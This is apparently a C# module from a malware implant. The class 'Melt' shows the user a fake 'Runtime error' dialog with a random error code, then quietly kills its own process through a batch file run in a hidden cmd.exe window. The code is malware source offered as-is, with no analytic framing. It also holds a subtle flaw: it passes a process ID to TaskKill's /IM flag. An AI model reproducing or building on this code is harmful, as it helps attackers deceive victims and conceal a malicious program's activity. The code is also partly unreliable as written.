using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Nullable.Modules.Implant
{
    internal sealed class Melt
    {
        public static void Activate()
        {
            string value = Modules.Manager.String.GenerateRandomHash(5, "ee");
            string code = "0x" + value.Substring(0, 5);
            Console.Beep();
            MessageBox.Show("Error code: " + code, "Runtime error");

            var batch = Path.GetTempFileName() + ".bat";
            var currentPid = Process.GetCurrentProcess().Id;
            using (var sw = File.AppendText(batch))
            {
                sw.WriteLine("chcp 65001");
                sw.WriteLine("TaskKill /F /IM " + currentPid);
                sw.WriteLine("Timeout /T 2 /Nobreak");
            }

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });

            Thread.Sleep(5000);
            Environment.FailFast(null);
        }
    }
}
